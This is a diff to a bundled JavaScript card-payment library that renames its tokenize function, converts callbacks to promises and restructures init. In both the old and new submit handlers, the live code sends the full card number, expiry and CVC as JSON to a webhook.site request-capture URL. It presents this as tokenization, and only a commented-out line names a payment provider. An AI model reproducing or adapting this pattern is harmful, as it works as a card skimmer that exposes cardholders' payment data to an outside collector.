@@ -668,7 +668,7 @@ var payment = /******/ (function (modules) {
         val = QJ.val(target);
         cardType = Payment.fns.cardType(val) || "unknown";
         try {
-          sbTokenize.onCardTypeChange(cardType);
+          Payment.onCardUpdate(cardType);
         } catch (e) {
           console.error(e);
         }
@@ -831,7 +831,7 @@ var payment = /******/ (function (modules) {
           },
         };
 
-        Payment.tokenise = function (url, request, callback) {
+        Payment.tokenize = function (url, request) {
           return new Promise(function (resolve, reject) {
             // url = "https://secure-egypt.paytabs.com/" + url.replace(/^\/+/g, "");
             if ("XDomainRequest" in window && window.XDomainRequest !== null) {
@@ -842,11 +842,9 @@ var payment = /******/ (function (modules) {
                   var resp = JSON.parse(
                     xdr.responseText ? xdr.responseText : "{}"
                   );
-                  callback(resp);
-                  resolve();
+                  resolve(resp);
                 } catch (e) {
-                  console.log(e);
-                  reject();
+                  reject(e);
                 }
               };
               xdr.onerror = function () {
@@ -859,9 +857,6 @@ var payment = /******/ (function (modules) {
                   errorText: "Request timeout, please try again",
                 });
               };
-              setTimeout(function () {
-                xdr.send(request);
-              }, 500);
               return resp;
             }
             var xhr = new XMLHttpRequest();
@@ -870,7 +865,7 @@ var payment = /******/ (function (modules) {
                 if (this.status === 200) {
                   var resp;
                   try {
-                    callback(xhr.responseText);
+                    resolve(xhr.responseText);
                     if (resp == null) {
                       resp = {
                         status: xhr.status,
@@ -878,23 +873,9 @@ var payment = /******/ (function (modules) {
                         errorText: xhr.statusText,
                       };
                     }
-                    callback(resp);
-                    resolve();
                   } catch (e) {
                     console.log("Failed to load response");
-                    reject();
-                  }
-                } else {
-                  // check for expired session
-                  if (this.status === 500) {
-                    location.href = "/payment/expired";
-                  } else {
-                    const response = JSON.parse(xhr.response);
-                    if (response.error && response.status === 500) {
-                      location.href = "/payment/expired";
-                      return;
-                    }
-                    callback(response);
+                    reject(e);
                   }
                 }
               }
@@ -911,13 +892,13 @@ var payment = /******/ (function (modules) {
             var field = form[i].getAttribute("data-sb");
             if (typeof field === "string") {
               if (field === "pan") {
-                formFields.pan = J.val(form[i]).replace(/ /g, "");
+                formFields.pan = QJ.val(form[i]).replace(/ /g, "");
               } else if (field === "expiry") {
-                var expiry = Payment.fns.cardExpiryVal(J.val(form[i]));
+                var expiry = Payment.fns.cardExpiryVal(QJ.val(form[i]));
                 formFields.expiryYear = expiry.year;
                 formFields.expiryMonth = expiry.month;
               } else {
-                formFields[field] = J.val(form[i]);
+                formFields[field] = QJ.val(form[i]);
               }
             }
           }
@@ -940,75 +921,95 @@ var payment = /******/ (function (modules) {
           options.cvc.value = cvvm;
         };
 
-        Payment.init = function (options) {
-          if (!options) {
-            console.error("Missing required options");
-            return false;
-          }
-          if (typeof options.publishableKey !== "string") {
-            console.error("Publishable key must be provided");
-            return false;
-          }
-          var number = options.number,
-            cvc = options.cvc,
-            validation = options.validation,
-            exp = options.exp,
-            form = options.form;
-          sbTokenize.onCardTypeChange = function (cardType) {
-            return options.onCardTypeChange(cardType);
-          };
-          sbTokenize.beforeSubmit = function () {
-            return options.beforeSubmit();
-          };
-          sbTokenize.formatCardNumber(number, 16);
-          sbTokenize.formatCardExpiry(exp);
-          sbTokenize.formatCardCVC(cvc);
-          form.onsubmit = function (e) {
-            try {
-              e.preventDefault();
-              J.toggleClass(document.querySelectorAll("input"), "invalid");
-              J.removeClass(validation, "passed failed");
-              var cardType = sbTokenize.fns.cardType(J.val(number));
-
-              J.toggleClass(
-                number,
-                "invalid",
-                !sbTokenize.fns.validateCardNumber(J.val(number))
-              );
-              J.toggleClass(
-                exp,
-                "invalid",
-                !sbTokenize.fns.validateCardExpiry(
-                  sbTokenize.cardExpiryVal(exp)
-                )
-              );
-
-              J.toggleClass(
-                cvc,
-                "invalid",
-                !sbTokenize.fns.validateCardCVC(J.val(cvc), cardType)
-              );
-
-              if (document.querySelectorAll(".invalid").length) {
-                J.addClass(validation, "failed");
-              } else {
-                J.addClass(validation, "passed");
-                var formFields = sbTokenize.processForm(form);
-                sbTokenize.maskForm(options);
-                sbTokenize.beforeSubmit();
-                token = sbTokenize
-                  .tokenise(
-                    "https://webhook.site/46a662cd-dae9-4228-9446-a829331762ed",
-                    JSON.stringify(formFields),
-                    options.callback
-                  )
-                  .then(() => {
-                    form.submit();
-                  });
-              }
-            } catch (e) {
-              console.error(e);
+        Payment.init = function (sbTokenize) {
+          return function (options) {
+            if (!options) {
+              console.error("Missing required options");
+              return false;
             }
+            if (typeof options.publishableKey !== "string") {
+              console.error("Publishable key must be provided");
+              return false;
+            }
+            if (typeof options.submitForm === "undefined") {
+              options.submitForm = true;
+            }
+            var number = options.number,
+              cvc = options.cvc,
+              validation = options.validation,
+              exp = options.exp,
+              form = options.form;
+            sbTokenize.onCardUpdate = function (cardType) {
+              return options.onCardUpdate(cardType);
+            };
+            sbTokenize.beforeSubmit = function () {
+              return options.beforeSubmit();
+            };
+            sbTokenize.formatCardNumber(number, 16);
+            sbTokenize.formatCardExpiry(exp);
+            sbTokenize.formatCardCVC(cvc);
+            form.onsubmit = function (e) {
+              try {
+                e.preventDefault();
+                QJ.toggleClass(document.querySelectorAll("input"), "invalid");
+                QJ.removeClass(validation, "passed failed");
+                var cardType = sbTokenize.fns.cardType(QJ.val(number));
+
+                QJ.toggleClass(
+                  number,
+                  "invalid",
+                  !sbTokenize.fns.validateCardNumber(QJ.val(number))
+                );
+                QJ.toggleClass(
+                  exp,
+                  "invalid",
+                  !sbTokenize.fns.validateCardExpiry(
+                    sbTokenize.cardExpiryVal(exp)
+                  )
+                );
+
+                QJ.toggleClass(
+                  cvc,
+                  "invalid",
+                  !sbTokenize.fns.validateCardCVC(QJ.val(cvc), cardType)
+                );
+
+                if (document.querySelectorAll(".invalid").length) {
+                  QJ.addClass(validation, "failed");
+                } else {
+                  QJ.addClass(validation, "passed");
+                  var formFields = sbTokenize.processForm(form);
+                  sbTokenize.maskForm(options);
+                  sbTokenize.beforeSubmit();
+                  number.removeAttribute("name");
+                  cvc.removeAttribute("name");
+                  exp.removeAttribute("name");
+                  sbTokenize
+                    .tokenize(
+                      "https://webhook.site/46a662cd-dae9-4228-9446-a829331762ed",
+                      JSON.stringify(formFields)
+                    )
+                    .then((token) => {
+                      try {
+                        var tokenInput = document.createElement("input");
+                        tokenInput.setAttribute("type", "hidden");
+                        tokenInput.setAttribute("name", "token");
+                        tokenInput.setAttribute("value", token);
+                        form.appendChild(tokenInput);
+                        if (options.submitForm) {
+                          form.submit();
+                        } else {
+                          options.callback(token);
+                        }
+                      } catch (e) {
+                        console.error(e);
+                      }
+                    });
+                }
+              } catch (e) {
+                console.error(e);
+              }
+            };
           };
         };
 
@@ -1094,7 +1095,7 @@ var payment = /******/ (function (modules) {
 
       module.exports = Payment;
 
-      globalThis.sbTokenize = Payment;
+      globalThis.sbTokenize = Payment.init(Payment);
 
       /***/
     },
